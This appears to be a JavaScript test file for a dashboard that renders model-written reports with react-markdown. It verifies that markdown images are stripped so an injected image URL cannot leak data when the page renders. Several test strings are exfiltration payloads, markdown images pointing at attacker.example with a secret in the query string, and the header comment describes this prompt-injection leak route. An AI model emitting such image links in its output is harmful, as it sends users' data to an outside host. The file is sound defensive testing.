// A markdown image in model-written text must never become an <img>.
//
// The dashboard renders reports, job output and assistant replies with
// react-markdown. Those are text a model wrote from an untrusted posting, and
// `![x](https://host/p.png?cv=...)` makes the browser fetch that URL the moment
// the page renders. src/lib/markdown-options.mjs drops the element.
//
// Two checks: the option does what it says (and leaves links, tables and text
// alone), and every <ReactMarkdown> in src/ actually spreads it.
//
// Run:  node --test tests/lib/markdown-images.test.mjs

import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { dirname, join, relative, sep } from "node:path";
import { fileURLToPath } from "node:url";
import { listTree } from "../../../lib/walk-tree.mjs";
import { noMarkdownImages } from "../../src/lib/markdown-options.mjs";

// The required `Tests / test` job installs only the root package and runs every
// web/tests/lib suite in one process, so react and react-markdown are not there.
// The rendering checks need them, so they skip when they cannot be imported and
// run in web-ci.yml (npm ci, then npm test). The source guard at the bottom
// needs nothing and always runs.
let render = null;
try {
  const [{ createElement }, { renderToStaticMarkup }, { default: ReactMarkdown }, { default: remarkGfm }] =
    await Promise.all([import("react"), import("react-dom/server"), import("react-markdown"), import("remark-gfm")]);
  render = (md, extra = {}) =>
    renderToStaticMarkup(createElement(ReactMarkdown, { remarkPlugins: [remarkGfm], ...extra, children: md }));
} catch (err) {
  if (err?.code !== "ERR_MODULE_NOT_FOUND") throw err;
}
const needsReact = render ? false : "react-markdown is not installed here (web dependencies missing)";

test("noMarkdownImages asks react-markdown to disallow img", () => {
  assert.deepEqual(noMarkdownImages.disallowedElements, ["img"]);
});

test("react-markdown renders a markdown image as an <img> unless told not to", { skip: needsReact }, () => {
  // Proves the next tests are about the option and not about an input that
  // never produced an image to begin with.
  assert.match(render("![x](https://attacker.example/p.png?cv=SECRET)"), /<img\b[^>]*attacker\.example/);
});

test("an inline image is dropped, with its URL", { skip: needsReact }, () => {
  const html = render("Fit: strong.\n\n![status](https://attacker.example/p.png?cv=SECRET)\n\nEnd.", noMarkdownImages);
  assert.doesNotMatch(html, /<img\b/i);
  assert.doesNotMatch(html, /attacker\.example/);
  assert.match(html, /Fit: strong\./);
  assert.match(html, /End\./);
});

test("a reference-style image is dropped too", { skip: needsReact }, () => {
  const html = render("![status][s]\n\n[s]: https://attacker.example/p.png?cv=SECRET", noMarkdownImages);
  assert.doesNotMatch(html, /<img\b/i);
  assert.doesNotMatch(html, /attacker\.example/);
});

test("an image wrapped in a link is dropped and the link survives", { skip: needsReact }, () => {
  const html = render("[![x](https://attacker.example/p.png)](https://example.com/job)", noMarkdownImages);
  assert.doesNotMatch(html, /<img\b/i);
  assert.match(html, /<a href="https:\/\/example\.com\/job"/);
});

test("links, tables and emphasis still render", { skip: needsReact }, () => {
  const md = "**bold** and [a link](https://example.com)\n\n| a | b |\n|---|---|\n| 1 | 2 |\n";
  const html = render(md, noMarkdownImages);
  assert.match(html, /<strong>bold<\/strong>/);
  assert.match(html, /<a href="https:\/\/example\.com">a link<\/a>/);
  assert.match(html, /<table>/);
});

const SRC = join(dirname(fileURLToPath(import.meta.url)), "..", "..", "src");

test("every <ReactMarkdown> in src/ spreads noMarkdownImages", () => {
  const bare = [];
  let seen = 0;
  // JSX lives only in .tsx/.jsx files.
  for (const file of listTree(SRC, { match: /\.(tsx|jsx)$/ })) {
    const text = readFileSync(file, "utf8");
    // The opening tag, up to its first ">": its attributes hold no ">" of their own.
    for (const m of text.matchAll(/<ReactMarkdown\b[^>]*>/g)) {
      seen++;
      if (!m[0].includes("{...noMarkdownImages}")) bare.push(relative(SRC, file).split(sep).join("/"));
    }
  }
  assert.ok(seen >= 6, `expected to find the dashboard's <ReactMarkdown> elements, found ${seen}`);
  assert.deepEqual(bare, [], "these render markdown without noMarkdownImages, so a remote image in the text would load");
});
